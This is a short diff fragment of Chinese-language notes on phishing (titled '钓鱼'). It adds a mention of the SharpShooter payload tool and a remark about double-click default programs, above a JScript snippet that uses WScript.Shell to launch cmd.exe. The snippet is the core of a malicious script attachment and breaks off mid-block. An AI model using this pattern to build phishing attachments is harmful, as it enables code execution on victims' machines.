@@ -1,5 +1,9 @@
 # 钓鱼
 
+tool   SharpShooter
+
+看双击的默认程序
+
 ```javascript
 var shell = new ActiveXObject("WScript.Shell")
 var res = shell.Run("cmd.exe");
